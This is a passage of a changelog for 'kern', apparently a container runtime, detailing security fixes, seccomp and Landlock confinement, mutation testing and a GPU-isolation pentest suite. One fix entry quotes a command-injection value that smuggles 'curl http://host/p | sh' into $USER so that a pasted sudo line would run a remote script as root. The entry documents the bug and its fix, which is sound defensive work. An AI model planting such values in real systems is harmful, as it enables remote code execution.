# Changelog

**CLI stability.** As of v0.7.0 the command surface is stable: the verbs, their flags, and the
`--json` output shapes change incompatibly only on a **minor bump** (`0.8.0`+, since kern is `0.x`),
never on a patch, and only after a deprecation entry here at least one release earlier. `--json`
output is additive: new fields may appear, so consumers must **ignore unknown fields**; removing or
renaming one is the breaking change the minor-bump rule covers. A `cli_surface_is_frozen` test
snapshots the surface and fails the build on any undocumented change. Internal config-file keys may still evolve, but
scripts and SDKs written against the CLI can rely on it. Install the release binary with
`curl -fsSL https://raw.githubusercontent.com/getkern/kern/main/install.sh | sh`, or build from source
with `cargo install --git https://github.com/getkern/kern getkern --locked`. Full detail for any entry
is in the git history.

## Unreleased

**This is a MINOR bump (0.8.0), not a patch.** Two reasons, and the weak one is the new flag: a
`--entrypoint` added to a frozen CLI surface is additive and would not force it on its own. The
binding reason is the `USER` change below, which alters the gid resolved on an EXISTING path for a
class of images that runs today.

### Security

- **Five resource caps on untrusted registry data had no boundary test, and two security predicates
  had no test at all.** Found by mutation sampling rather than by reading: 20 mechanical mutants over
  files that have tests, of which 13 were ones a unit test could have killed and 5 survived - a 38%
  survival rate on reachable sites.

  Two of the five were the file's own defences. `take_data`'s `real_here.min(room)` is the bound that
  holds a returned buffer to `keep` on bytes from a registry; `min` became `max` and 920 tests stayed
  green. `has_bare_lf` is the documented request-smuggling defence; inverting it ACCEPTS the smuggled
  request and REJECTS well-formed CRLF, and nothing reached it because it sat inline in a function
  that takes a socket. It is a pure function now, which is the only shape in which it can be asserted
  in both directions.

  A second, targeted sweep over `vet_tar_stream` then found the pattern rather than the instance:
  8 of 14 mutants died, and FIVE of the six survivors were caps - `MAX_TAIL_BLOCKS`, `TAR_MAX_LONG`
  at three sites, `MAX_LAYER_ENTRIES`. The identity checks in that vetter were covered and not one of
  the limits was, and the limits are the whole defence against a malicious layer rather than a
  malformed one. `valid_allow_entry`'s 253-character FQDN bound was uncovered in the same way.

  MEASURED, NOT ASSUMED: the zero-padding boundary sits at `MAX_TAIL_BLOCKS - 1` extra blocks,
  because the end-of-archive marker's second zero block already enters the tail loop. The test says
  so, so the next reader does not go looking for an off-by-one that is not there.

  THE SAMPLE IS A LOWER BOUND. Sites were drawn only from files that HAVE tests, which excludes by
  construction the files most likely to hold a gap. "38% of sampled testable sites do not
  discriminate" is what was measured; "38% of the code is unprotected" was not.

  The two survivors outside the registry path are closed too. `clamp_cpus` needed its comparison
  EXTRACTED before it could be asserted at all: at `c == host` the clamped result and the unclamped
  one are the same number, so mutating `>` to `>=` leaves every return value untouched and changes
  only the warning - which then tells an operator that N CPUs "exceeds the N available". A false
  message was the entire observable difference. `profiles_table` put the selection marker on every
  row EXCEPT the selected one under `i != sel`, which is the `k`-kills-the-box failure reached from
  the rendering side.

  Injection: verified - every cap and predicate was re-mutated after its test landed; `>` to `>=` on
  the tail cap, on both `TAR_MAX_LONG` sites, on the entry cap and on `cpus_exceed_host`, `min` to
  `max` on the buffer bound, `!=` to `==` on the bare-LF check, `i == sel` to `i != sel` on the
  marker, and `> 253` / `<= 63` on the allowlist bounds. Each turns its own case red. The entry-cap
  case costs 7.1 s in debug because a two-million-member cap can only be asserted by reaching it.

### Changed

- **A numeric `USER` now takes its group from the image's `/etc/passwd`, not from its own number.**
  Listed here and not under Fixed: from kern's side it is a correction, and from the side of anyone
  running a box that worked - with a volume holding files written under the old gid - it is a
  behaviour change that can break them. A CHANGELOG is read to answer "does this break something of
  mine", and the honest classification is the one that answers that question rather than the one
  that describes the intent.

  Affects every image whose `USER` is numeric AND whose passwd entry declares a different primary
  group. `USER 1000` resolved to `gid 1000`; it now resolves to what the image says, and to the root
  group when the image lists no entry for that uid.

  VERIFIED AGAINST THE IMPLEMENTATION, not against documentation: `moby/sys/user`'s `GetExecUser`
  sets `user.Gid = users[0].Gid` from the matched passwd entry, and leaves `user.Gid` at
  `defaults.Gid` when a numeric uid has no entry - which runc's `libcontainer/init_linux.go` sets to
  `0`. The earlier claim rested on prose; this is the code that runs.

  `quay.io/keycloak/keycloak:26.1` declares `USER 1000` with `keycloak:x:1000:0:` and lays its tree
  out as `drwxrwxr-x root root`. With gid 1000 the process could not write its own installation,
  Quarkus' startup augmentation failed to write into its runner JAR, `jdk.nio.zipfs` reported the
  JAR as a read-only zip filesystem, and the box restart-looped on a `ReadOnlyFileSystemException`
  naming nothing about permissions. A field report attributed it to tmpfs exhaustion; reproduced
  here with 3.2 GB free, which ruled that out. The image now starts:
  `Keycloak 26.1.5 … started in 3.693s. Listening on: http://0.0.0.0:8080`.

  THE FIRST CORPUS FOR THIS WAS WORTHLESS AND IS RECORDED SO IT IS NOT REPEATED. Six official images
  were run and all answered `0:0` under both rules, because not one declares a `USER`: the check was
  never reached. It would have stayed green with the fix inverted. The corpus that replaced it was
  built to discriminate - `1000:0`, `1000:2000`, and a uid absent from passwd - and gives 1000/1000/1000
  under the old rule against 0/2000/0 under the new one, on three built images across two built
  binaries.

  Injection: verified - `Ok(n) => (n, n)` restored, and the always-0 variant; both turn
  `a_numeric_user_takes_its_primary_group_from_the_images_passwd` red on the discriminating rows.

  It moves box start onto a file read per box, which is why it was measured: 400 runs per side on an
  image that declares a `USER`, medians 3.5 ms on both, minima 2.8 against 2.9. That is a cost BELOW
  THE NOISE FLOOR of this measurement, which is not the same as no cost and is not claimed as one.

### Changed

- **An image `USER` the image cannot resolve now refuses to start the box, as Docker does.** It used
  to run the workload as box root after printing a note on stderr, so that an odd image still
  started. That is the wrong shape of failure: an image whose entire purpose is to drop privilege got
  the opposite of what it asked for, and the only evidence was one line printed above the workload's
  own output. A field test reported the behaviour as "ran as 0:0, not an error" without mentioning
  the note at all, which is the argument against a warning in that position, demonstrated rather than
  asserted. Docker refuses the same input (`unable to find user X: no matching entries in passwd
  file`), and kern reads its user spec by Docker's rules everywhere else on that path.

  The escape hatch is not removed, it is made explicit: `--user 0` runs as box root on purpose, and
  an explicit `--user` still overrides an image whose own `USER` is unresolvable. Nothing changes for
  an image whose `USER` resolves, which is every image that works today; the check is in
  `resolve_run_as`, so the decision is asserted without an image on disk.

  Injection: verified - restoring the fallback turns
  `an_unresolvable_image_user_fails_closed_instead_of_running_as_box_root` red. Measured end to end:
  `USER 1000:nosuchgroup` and `USER nobodyhere` now exit 1, a resolvable `USER 1000` still gives
  `1000:0`, and `--user 0` still gives `0:0`.

### Fixed

- **The container-only port warning quoted port 8000 whatever the file said.** A stack declaring only
  `9090` was told about a port that appears nowhere in it, so the sentence read as an observation
  when it was an example. A field test had to isolate the case to establish that kern was not
  carrying stale state from another file before it could dismiss it. The note names the port that
  triggered it, and `warn_once` now dedupes per distinct port rather than per file.

  Injection: verified - restoring the fixed sentence turns
  `the_container_only_port_note_names_the_port_the_file_declared` red.

- **`kern doctor` reported a missing `/etc/subuid` allocation that was there.** The lookup
  interpolated `$USER` into the pattern it searched for, so with the variable unset it looked for
  lines beginning with `":"` and matched nothing: a host with `newuidmap` installed and
  `root:100000:65536` in the file was told that `--uid-range`, non-root `--user` and `--ssh` would
  fall back to a single-uid map, and handed a `sudo tee` line to add an allocation it already had.
  `USER` is not set for a daemon, a container, `sudo` without `-E`, or many CI runners, and this is
  the first command an operator runs.

  The identity now comes from `getuid` plus `/etc/passwd`, and BOTH spellings shadow-utils accepts
  are matched: the login name, which is what `useradd` writes, and the numeric uid. The environment
  is not consulted at all, which also retires the last use of a variable that had already produced a
  command-injection defect in this same function.

  Injection: verified - restoring the previous `doctor.rs` and running `env -u USER kern doctor` on a
  host whose allocation exists reproduces the false warning, with the wrong hint (`echo
  1000:100000:65536 ...` while `alex:100000:65536` was already present). Reported from the field
  against the `dev` branch.

- **`kern builds --status interrupted` listed builds that the same command printed as `running`.**
  `running` and `interrupted` are one stored status told apart only by asking whether the process is
  still there, and the filter compared the STORED status, so either word selected every unfinished
  record. Asking for interrupted builds returned the one that was building at that moment.

  The filter is answered by `Record::label`, the same call that fills the STATUS column, so the query
  and the column cannot disagree. This is the same shape as the defect it sits beside: a condition
  derived in two places drifts.

  Injection: verified - restoring the stored-status comparison turns
  `the_status_filter_selects_by_the_word_the_status_column_prints` red with
  `left: ["inflight", "abandoned"]`. Reported from the field against the `dev` branch.

- **The flat build's base copy now names what it costs and why.** `copy_tree` passes
  `--reflink=auto`, which clones the base on btrfs/xfs/bcachefs and silently falls back to a full
  byte copy everywhere else - `auto` is defined not to complain. That one property decides whether a
  flat build of a 2 GB base costs milliseconds or minutes, and nothing said which one you had. The
  build line and `kern doctor` both state it now.

  Injection: verified - dropping the probe's cleanup turns
  `the_reflink_probe_answers_and_leaves_nothing_behind` red.

  Measured while evaluating a field report's suggestion to "cache the flattened base rootfs per
  image": kern already does that, at pull time - the image cache IS a flattened rootfs, with no
  layer chain to merge - and an unchanged rebuild is already skipped
  (`[cached · flat image unchanged]`, 0.00 s). What remains is the writable copy, which cannot be a
  hardlink farm without a RUN step corrupting the shared cache, and cannot be an overlay because the
  flat path exists precisely where overlay is unavailable. On this ext4 host `cp --reflink=always`
  is refused and a 2.1 GB base copies in 0.86 s with the source in page cache - a LOWER BOUND, since
  the caches cannot be dropped without privilege. The reporter's 2m49s is WSL2's filesystem, not a
  repeated flattening.

- **The README's compatibility promise now carries the constraint that qualifies it.** The
  shared-namespace rule - two services in one stack cannot both listen on the same container port -
  lived only in `docs/DOCKER-COMPAT.md`, while the README said `read as-is`, "with no conversion
  step" and `# a real stack, unchanged` under the heading *"Your Docker Compose stack, without
  Docker Desktop"*. A heading takes no clause, and the possessive claimed every reader's file, so
  that one is now *"Docker Compose files, without Docker Desktop"* with the constraint in the
  paragraph under it and in the comparison row.

  Injection: none - prose only. The behaviour it now describes is asserted elsewhere
  (`cli_surface_is_frozen`, and the port-collision entry below).

  The Status line said the CLI surface can still change. That has been false since v0.7.0: the
  CHANGELOG declares it stable and `cli_surface_is_frozen` holds the build to a committed snapshot.
  Config-file keys, which no gate freezes, keep the caveat.

- **A refused port collision named the box, not the service.** `services 'myapp-keycloak' and
  'myapp-api' both listen on container port 8080/tcp` for a file whose services are `keycloak` and
  `api`, because both checks read `ComposeBox::name` after it has been rewritten to the box name.
  Injection: verified - restoring `b.name` in either check turns
  `the_collision_message_names_the_services_the_file_declares` red; both were tried separately.

  Fixed in the container-port check and the host-port check together: fixing one would have left a
  reader chasing a name their file does not contain on half the failures.

- **`kern box --entrypoint`: an override that actually overrides.** Repeatable (one argv element per
  occurrence, so an exec-form list needs no quoting convention), and `--entrypoint ""` clears the
  image's entrypoint the way compose's `entrypoint: []` does. Additive to the frozen CLI surface: no
  verb or flag was removed or renamed.

  It replaces two workarounds that could not work. The `docker` shim implemented `--entrypoint` by
  PREPENDING the value to the box command, and the compose parser folded `entrypoint:` into
  `command:` the same way. Both compose to `IMAGE_ENTRYPOINT ++ override ++ args` once the box
  prepends the image's own entrypoint - correct only for an image that HAS no entrypoint, which is
  never the case anyone reaches for an override in. Measured against
  `quay.io/keycloak/keycloak:26.1`, whose entrypoint is `kc.sh`: asking for a shell produced
  `kc.sh sh -c …` and the image answered `Unknown option: 'sh'`, which is what stopped a field
  report from getting a shell inside an image to diagnose a crash loop.

  Injection: verified - four, one per call site: the override ignored, the image CMD kept, the shim
  prepending again, and compose merging into `command`. Each turns its own case red.

  Both callers forward the flag now, so the CLI, the shim and compose cannot disagree about it, and
  the override discards the image's `CMD` as Docker documents - a default that belonged to the
  entrypoint being replaced.

- **Final validation: eight sentences narrowed to their measurement, and one suite moved out of the
  stamp and into CI.** Two reviewers, one asked whether the prose was wider than the evidence and one
  asked whether the work survives without its author.

  Eight claims said more than had been measured, and none of them was wrong, which is the point:
  each was stated at a width the measurement does not carry. "No userspace VRAM quota can be a
  boundary" was universal over three hosts. "Trivially bypassed on consumer NVIDIA" was a class over
  two NVIDIA machines. "`dmem` accounts faithfully on AMD and Intel from kernel 6.14" was a property
  of a controller over one card, one driver, one kernel. "Every allocation entry point sits behind
  the same ioctl channel" was an assertion about paths the probe never touched. The cooperative
  tier's own claim ended with "for a real boundary use a MIG GPU or an SR-IOV part", pointing at
  hardware whose VRAM split kern had just finished admitting it has never measured. The read-only
  GPU scan was a property of the tool where it is one machine agreeing with the code. Each now
  states its host, its card, its driver or its mechanism.

  `pentest-gpu-claims.sh` now runs **in CI on every push**. It starts no box, so the AppArmor policy
  that keeps the other four out does not apply, and on a GPU-less runner it exits 0 having asserted
  that `doctor` reports the absence rather than inventing a card, and that the claim-word matcher
  still catches an overstated string. That second one is the positive control: without it the whole
  gate could go vacuous while every run stayed green. Verified by running the suite in a namespace
  with an empty `/sys/class/drm` and a synthetic `/dev`.

  That split is the answer to a sharper point: a `.last-run` stamp is a promise that a person did
  something, and a successor inheriting a red freshness check for suites CI structurally cannot run
  will raise the threshold or silence it. So what can be automated is, what cannot is named, and the
  stamp now covers four suites instead of standing in for five.

  `CONTRIBUTING.md` gained the bridge the repo was missing: the GPU work is the TEST CASE for the
  three rules, not the point of them. 915 lines printing two strings looks out of proportion until
  that is said out loud, and it was said nowhere outside the commit messages. It also records the
  shape of every defect three review rounds found: ten of them, all the same class, a sentence or an
  exit code that said more than had been measured, and not one a runtime bug.

  And `stale-numbers.py` now says WHY its two pinned sentences are pinned. Each is an admission of a
  limit, and they fail in opposite directions: losing the cooperative one makes a quota read as a
  capability, losing the hardware one asserts an enforcement nobody checked. A gate that says only
  "restore this string" hands a successor the lock without the reason.
- **Closing the GPU phase: a shell payload in a `sudo` hint, a second weak green, and the rules
  written down.** A third review round plus a closing review, and everything either fixed or stated.

  `kern doctor` interpolated `$USER` into a `sudo tee` command it invites the reader to paste. With
  `USER='x; curl http://host/p | sh #'` it printed a line that runs an attacker's script as root,
  from the tool someone ran to find out whether their machine is safe; an ANSI escape in the same
  variable reached the terminal verbatim. `$USER` is environment, and a container, a CI runner or
  `sudo -E` all get to set it. It is now an allowlist of the portable POSIX name set, falling back to
  the numeric uid, which `/etc/subuid` accepts and which cannot carry a payload. This code predates
  the GPU work and was read because of it.

  `pentest-gpu-claims.sh` had a second way to exit 0 without verifying anything: the previous round
  closed the missing-compiler case, and left the case where the probe builds and there is no openable
  device node for it to interrogate. Same verdict now, exit 3, different reason. Verified by running
  the suite in a mount namespace where every GPU node is `/dev/null`.

  `TIER-HW` was a branch no test could reach, and its fail-closed behaviour was asserted in a comment.
  Two tests now drive it with a synthetic device directory: one forces the promotion with garbage in
  every neighbouring attribute, one asserts garbage everywhere with no partition link falls to
  `TIER-SOFT` without panicking. The promotion itself still has no positive control, and SECURITY.md
  now says so in prose along with the probe's AMD arm having never executed, because both were marked
  in the source where a reader deciding whether to trust the verdict never looks.

  `check_scope_toll` printed its measured median with no ceiling on the interpretation, so a loaded
  host could report "at least 8472.3 ms" as though that were the cost of a systemd scope. The number
  is still printed; above 250 ms, six times the worst host ever measured, it now carries the fact
  that it is most likely measuring load.

  The claim gate matched `TIER-HW ... enforce` in one direction only, so the reverse order was a
  false negative, and it would have failed a document describing the gate itself. Both fixed, with a
  positive control for each. And the three rules the whole phase was built on, which lived only in
  commit messages, are now `CONTRIBUTING.md`: ship a tier only if the code can assign it, publish the
  demonstration that a defence is not a boundary before announcing it, and hold a claim to its code
  with a gate that has a sabotage test rather than with the discipline of whoever edits next.
- **A second review round: a lying exit code, a green that verified nothing, and the MIG mapping
  settled from source.**

  `gpu-raw-ioctl.c`'s `exhaust` mode returned the exit code the file's own header defines as "the
  driver answered a raw ioctl" on the strength of `open` alone, having issued no ioctl at all. No
  caller read it that way, which is not a defence. It now asks the last descriptor it opened, so the
  code is true and the fact is stronger: the number counts handles that still reach the driver, not
  handles that opened. Its `/proc/self/maps` scan also carries a tail between chunks, so a maps line
  longer than the buffer can no longer hide a vendor library across the cut.

  `pentest-gpu-claims.sh` could exit 0 on a host with a GPU and no C compiler: section A green,
  battery B entirely skipped, nothing attacked. `run-all.sh` stamps `pentest/.last-run` on a zero,
  and that stamp is what stops "not in CI" from decaying into "never run", so the decay was arriving
  through the check meant to prevent it. There is now a third outcome, exit 3, that says the decisive
  battery did not run; the skips stay skips, and the stamp is refused.

  The MIG attribution is no longer unverified. It was the only remaining route to an unearned
  `TIER-HW`: if `capabilities/gpu<N>` were keyed by something other than the device minor, one card's
  instances could promote another. It is the device minor, read from NVIDIA's own source rather than
  inferred from a single-GPU host that could not tell the two apart: `nv-procfs.c` prints
  `nvl->minor_num` as `Device Minor:`, `nv.c`'s `nv_get_dev_minor()` returns that field, and `os.c`'s
  `osRmCapRegisterGpu` formats the capability directory as `"gpu%u"` from it.

  The claim gate grew an arm and lost an illusion. Any document that writes `TIER-HW` next to a form
  of "enforce" must now carry the hardware caveat, matched over a window rather than a line because
  markdown wraps and the first version of the rule was switched off by a line break. README, ROADMAP
  and the FAQ were stating the short form without it. And the gate's docstring now records what it
  cannot catch, with the reviewer's counterexample verbatim: a sentence added elsewhere on the page
  that gives back what the caveat took away passes every check here, and detecting it is reading for
  contradiction rather than pattern matching.
- **The hardware tier now claims what it proved, after an outside review caught it claiming more.**
  `TIER-HW` read "per-tenant VRAM enforced by the device", which asserts an ENFORCEMENT. What the
  detector establishes is a TOPOLOGY: a `physfn` link means an SR-IOV virtual function, a `gi*`
  capability means MIG instances are configured, and neither is a measurement of the memory split.
  That is the same "present therefore enforcing" step this model refuses when it declines to promote
  a card for merely having a `dmem` controller, so the strongest claim in the file was the least
  supported, on the one branch that has no positive control anywhere in the tree because kern has
  never run on MIG or SR-IOV hardware.

  The string now names both gaps: that kern read the partition's presence and did not measure the
  split, and that the verdict is per CARD while MIG partitions per INSTANCE ASSIGNED, so a tenant
  handed the whole device node on a MIG-configured card is not inside a GPU instance. `stale-numbers`
  pins the new wording in the code and in SECURITY.md, verified by sabotaging each.

  Two smaller corrections from the same review. The `physfn` test required only that the path EXIST,
  and the unit test fed it an empty regular file, so the check and its fixture agreed with each other
  while both were looser than sysfs: it now requires the symlink the kernel actually creates, with a
  test for the file case and one recording that a dangling link still counts. And SECURITY.md claimed
  "no userspace mechanism" passes the raw-ioctl test, which is too wide: what fails is a userspace
  VRAM QUOTA. Refusing the device outright, by not binding `/dev/nvidia*`, `/dev/dri/*` or
  `/dev/kfd` into the box or by filtering `ioctl` on them, is userspace policy and does hold. A box
  with no GPU is contained; a box with a GPU and a number attached to it is not.
- **A fifth adversarial suite, and it publishes a defeat.**
  [`pentest/pentest-gpu-claims.sh`](pentest/pentest-gpu-claims.sh) attacks a claim rather than a
  mechanism: kern slices no GPU, so there is no cap here to break, and what is under test is whether
  `kern doctor`'s verdict about each card survives contact with the host's own driver.

  Section A checks what kern says: one tier row per DRM card counted from `/sys/class/drm` rather
  than from kern's own output, the reserved vocabulary refused on every row below `TIER-HW` with a
  positive control behind it, the disclaimer present on every cooperative row, the verdict identical
  across five runs and unchanged with `LD_*`, `KERN_SECCOMP` and `KERN_CONFIG` set, and the GPU scan
  asserted read-only against `strace`.

  Section B is battery B of the GPU isolation spec, T1 to T9, run by
  [`pentest/gpu-raw-ioctl.c`](pentest/gpu-raw-ioctl.c), a probe that links libc and nothing else and
  reads its own `/proc/self/maps` before it counts anything. **T5 is the decisive one and it fails
  the way the tier model says it must**: a process with no vendor library in its address space
  reaches the driver with a raw ioctl. Measured on an RTX 5060 Ti (driver 580.173.02), a Jetson Orin
  Nano (540.4.0, `tegra`, `nvidia-drm`) and a Raspberry Pi 5 (`v3d`, `vc4`), so it is not a property
  of one driver build or one architecture. T7 settles the granularity: the descriptor answers the
  same ioctl after crossing a unix socket into a process that never opened the device. T8 found the
  ceiling on the boards, 1021 handles stopped by `RLIMIT_NOFILE`, which is the file-descriptor limit
  a tenant inherited from its shell and not a device quota.

  Section C is the only hard failure in the file: the card B found an open channel to must be the
  card A calls `TIER-SOFT`. Everything B measures is a property of the driver; only a disagreement
  between the claim and the measurement is kern's defect.

  [SECURITY.md](SECURITY.md) now carries the same evidence in prose, including the `dmem` result
  behind the missing middle tier, and `scripts/stale-numbers.py` gates the claim: a document may not
  name a tier the code cannot print, the cooperative disclaimer must match `Tier::claim()` verbatim
  on the two pages that carry it, and the reserved vocabulary must be identical in the Rust gate and
  the shell one. All four arms verified by sabotage.

  Also corrected while measuring it: `doctor`'s module header said it performed no mutation, and it
  does. Its memory-cap check creates a `kern-capprobe-<pid>` cgroup, writes that child's own
  `memory.max` and removes it, which is the only way to answer whether a cap binds. That was
  documented in `kern-isolation` and contradicted in `doctor`; the header now names it.
- **`kern doctor` now reports what a VRAM cap on each GPU would be worth.** kern still slices no GPU
  and this changes nothing about what it can do: it publishes the JUDGEMENT ahead of the capability,
  so there is never a window in which kern can cap a GPU while its own description of that cap is
  still catching up.

  One line per DRM card, with the evidence for it. `TIER-HW` for a partition the device itself
  enforces (an SR-IOV virtual function, or MIG instances configured for that card). `TIER-SOFT` for
  everything else, which on consumer hardware is what you get: a cooperative quota, worth density,
  fairness and accidental-overcommit accounting for trusted and semi-trusted tenants, and **not a
  boundary against malicious code**. A tenant that talks to the device without going through the
  vendor library never passes any userspace interception, and VRAM is committed by a fault handled
  in the kernel and the GSP, so there is no syscall to trap either. That is a property of the
  problem, not a defect above the kernel, and the line says so where you would read it.

  There is no middle tier, and its absence is a measurement rather than an omission. A
  kernel-enforced `dmem` cap that charged the path the tenant allocates through would be one, but on
  the driver this was measured against `dmem` accounts without enforcing for the ROCm compute path:
  with `dmem.max` at 2 GB an 8 GB `hipMalloc` succeeded while the leaf cgroup's `dmem.current` stayed
  at 0. The DRM render path is charged, the KFD compute path that ML tenants use is not. So `dmem`
  and `/dev/kfd` are reported next to the card as FACTS and never as a promotion.

  Detection is read-only: `/sys/class/drm`, three sysfs attributes per card, and `/proc` for the
  NVIDIA and cgroup facts. It opens no device, loads no library and caps nothing, which is why it
  fits in the same single static binary. Measured at 36 us per scan on an i7-14700KF, against a
  `doctor` run that already spends milliseconds in `systemd-run` probes.

  It fails closed in both directions that matter. Unknown resolves to the weaker claim, never the
  stronger: a card is promoted only on evidence read from the kernel, and MIG instances are
  attributed to the card that owns them by PCI address, so one MIG card on a host cannot promote
  another. And a card kern cannot identify is DESCRIBED, not dropped: a Raspberry Pi 5 (`v3d`,
  `vc4-drm`) and a Jetson Orin Nano (`drm`, `nv_platform`) have DRM cards on the platform bus with no
  PCI vendor at all, and both now name the driver instead of reporting no GPU. Verified on both
  boards.
- **`--landlock-rw <path>` now works on `kern run`**, not only on `kern box`. It is the one confinement
  the governor verb can offer for real, because Landlock restricts the calling process instead of
  requiring a mount namespace: no image, no `pivot_root`, nothing to build. `kern run --landlock-rw
  ~/project -- ./agent` runs the binary already on the host with its writes confined by the kernel to
  that directory, while everything else stays readable and executable. This is additive: no existing
  invocation changes behaviour.

  Two things differ from the same flag on `box`, both because there is no namespace to hide behind.
  **It grants only what you name**, plus the character devices a program opens for writing
  (`/dev/null`, `/dev/zero`, `/dev/full`, `/dev/random`, `/dev/urandom`, `/dev/tty`). Inside a box
  `/tmp`, `/run` and `/proc` are the box's own ephemeral ones and are granted automatically; on the
  host they are real and persistent (`/run/user/$UID` alone holds the systemd user manager's private
  socket), so granting them would silently widen "confine writes to this path" into something else.
  And **it refuses to run** where the kernel has no Landlock, diverging from `run`'s cooperative
  policy for resource caps: a cap that cannot be applied leaves the command running without a limit,
  which `run` says out loud, but a confinement that cannot be applied would leave it running with the
  operator's files reachable while they believed otherwise.

  It implies `no_new_privs`, which Landlock requires, so `sudo` inside the confined command stops
  working. A `--landlock-rw` path that does not exist, or whose final component is a symlink, is now
  refused with the path named rather than silently skipped: on a box that silence is fail-safe, but
  under `run` the allowlist is the entire confinement, so a grant that vanishes leaves a command that
  can write nowhere.

  The flag reaches the process that execs the workload through the scope re-exec as argv, which is
  passed verbatim. That is a property of the code rather than of the type, and if it ever broke, an
  argv that lost the flag would be indistinguishable from one that never carried it: a confined
  workload and an unconfined one, with nothing downstream able to tell them apart. So the request now
  travels beside it as a predicate (`KERN_LANDLOCK_REQUIRED`), never the paths. The two channels are
  asymmetric on purpose and never assert the same fact, so they cannot disagree in a way that needs a
  tie-break; the predicate arriving without the paths is the impossible state, it is the exact
  signature of a lost transport, and it aborts before `execve`. Losing both across the same `execve`
  takes two independent bugs rather than one.

  Verified on this desktop (Landlock ABI 8) with a positive control on every assertion: writes land in
  the granted path, `/tmp` and `/etc` are denied while the same write succeeds without the flag, reads
  and `exec` outside the grant still work, the confinement survives `execve` into a child, a symlink
  planted inside the grant does not reach outside it, cross-directory `rename` and `link` out of the
  grant are denied, and `/proc/self/oom_score_adj` is not writable. The cost is below the noise floor
  of 600 interleaved runs.

### Fixed

- **A Landlock grant on a file rather than a directory no longer loses the whole ruleset.** The rule
  was built with every access right the kernel's ABI knows, including the directory-only ones
  (`*_DIR`, `MAKE_*`, `REFER`); the kernel answers `EINVAL` when those are asked for on a file or a
  device node, and the failure discards the entire ruleset, not just that rule. Every path kern granted
  before happened to be a directory, so this was latent on both verbs: `kern box --landlock-rw
  /etc/hosts` failed the same way. The rights are now masked to the file-valid subset when the target
  is not a directory, so a per-file grant works and a `fstat` that fails takes the narrower branch.

## v0.7.0 - 2026-08-24

The first published release: static binaries for x86_64 and aarch64, a Windows shim and a WSL rootfs,
each with a `.sha256`, from a GPG-signed and independently timestamped tag. Everything below shipped in it.

### Security

- **`--landlock-rw` is now fail-closed** (behaviour change, and the only one to a flag's meaning in
  this release). On a kernel without the Landlock LSM it used to warn and start the box with no path
  allowlist; it now refuses to start. kern already had an enforce-or-do-not-run family
  (`--require-limits` for cgroup caps, `--apparmor` for the LSM profile) and this was the one member
  that degraded, so the same script confined writes on a laptop and confined nothing on a board. The
  refusal names the flag, both reasons the LSM can be absent (not built in, or switched off with
  `lsm=`), and the way out. **Boxes that do not pass the flag are unaffected.** The cost is deliberate:
  a script that hard-codes `--landlock-rw` across a mixed fleet now fails on the boards rather than
  running unconfined there, and `kern doctor` reports the ABI so it can be gated. Verified on a
  Raspberry Pi 5 whose only LSM is `capability` (refused, message names the flag; without the flag the
  box starts) and on a Landlock ABI v8 host (write inside the allowlist succeeds, write outside is
  denied).
- The default seccomp filter is now a deny-by-default **allowlist** (moby's own default filter minus
  kern's 35 escape syscalls), not the wider denylist: a syscall outside the vetted set returns
  `ENOSYS`, and the escape vectors still hard-kill (`mount`/`unshare`/a namespace-flagged `clone`
  all SIGSYS, verified on a default box). This is Docker's own default posture minus 34, so it is at
  least as compatible while being strictly narrower - the whole future syscall surface is closed by
  default rather than reached. The wider denylist is the opt-out via `KERN_SECCOMP=denylist`;
  `--security-profile untrusted` is unchanged (allowlist + `--cap-drop ALL` + `--read-only`), and an
  `exec` reproduces the box's own recorded filter. Validated: a default box runs common workloads
  (shell, `ls`, `cat`, `id`) and 436 unit tests pass.
- Registry-posture forgery closed: every host-path input (`-v`, `--secret`, `--env-file`, `--rootfs`,
  build context and `-f`, `kern cp` in both directions, `save -o`) refuses any source that resolves
  onto the trust-bearing runtime dirs, by `(device, inode)` identity as well as path. The default is
  inverted: everything under the runtime dir is refused except the box-data `logs/` and `scratch/`.
- `socket(AF_VSOCK, …)` refused with `EAFNOSUPPORT` in both seccomp modes.
- The bounding-set drop is verified with `PR_CAPBSET_READ`, and under `--cap-drop ALL` every set
  (`CapEff`/`CapPrm`/`CapInh`/`CapAmb`/`CapBnd`) is read back all-zero from `/proc/self/status` -
  ambient included, since it survives `execve` and `NO_NEW_PRIVS` does not clear it.
- `CAP_SYS_PTRACE` dropped by default (16 caps), closing the **cross-UID** `/proc/<pid>/mem` read.
  (A same-uid sibling read inside one box is standard Linux and not a boundary; a host or peer-box
  pid is not visible in the box's pid namespace, so its memory is unreachable regardless.)
- `CAP_NET_ADMIN` and `CAP_SYS_ADMIN` dropped by default too, converging kern's default capability
  set onto Docker's/Podman's. They are re-kept CONDITIONALLY: `NET_ADMIN` for `--tun` (the box brings
  its own tunnel interface up; kern brings `lo` up before the drop, so loopback is unaffected) and
  `SYS_ADMIN` for `--privileged` (in-namespace `mount`), or either via `--cap-add`. `kern exec` stays
  strict and re-keeps neither, staying no more privileged than the box's PID 1. Their escape syscalls
  (the mount API, `bpf`) are seccomp-killed on a non-privileged box regardless, so this is
  defense-in-depth, not a boundary change.
- The seccomp mode is recorded and reproduced by `kern exec` and the health probe, not re-derived
  from the caller's env; an absent or corrupt record makes `exec` fail-loud.
- `KERN_MAX_CONCURRENT` enforced atomically under a `flock`, closing the fleet-cap TOCTOU.
- A SIGKILL'd detached supervisor's box is reaped via `cgroup.kill`.
- An inherited caller fd no longer leaks into the box: `shed_inherited_fds` before `execvp`
  (CVE-2016-9962 class).
- A pulled layer's setuid/setgid bit is stripped at extraction.
- OCI supply-chain hardening: a digest-pinned pull (`img@sha256:<hex>`) is content-addressed - the
  fetched manifest and the selected arch sub-manifest are sha256-verified, so a compromised registry
  cannot serve different bytes under a pin. The tar vetter also rejects a hardlink whose target
  descends an escaping symlink (a host-inode disclosure/corruption class), and an aggregate layer-count
  cap bounds a resource-exhaustion manifest.

### Fixed

- **A box's exit code no longer depends on the init system's version.** Same binary, same workload
  past its `--memory` cap: an Arduino UNO Q (systemd 257) reported **143** where a Raspberry Pi 5 (252)
  and a Jetson Orin Nano (249) reported **137**, and a DETACHED box on the newer manager left no exit
  record at all - `kern ps -a` empty, `kern wait` answering "no exit record for one" - so an SDK could
  not tell an OOM-killed box from one that never ran. The kernel had SIGKILLed the box on all three;
  what differed is that the newer systemd's default `OOMPolicy=stop` answers that same kill by stopping
  the unit, with a SIGKILL to the whole scope - including the kern process that had the box's status in
  hand and had not yet written it. Three things now hold it: on the scope path the box is capped in its
  OWN cgroup inside the scope (`kern-box-*`, at exactly the requested cap) with kern's supervisor in a
  `kern-sup` sibling, so the whole-box OOM kill takes the workload and not the bookkeeper; a fatal
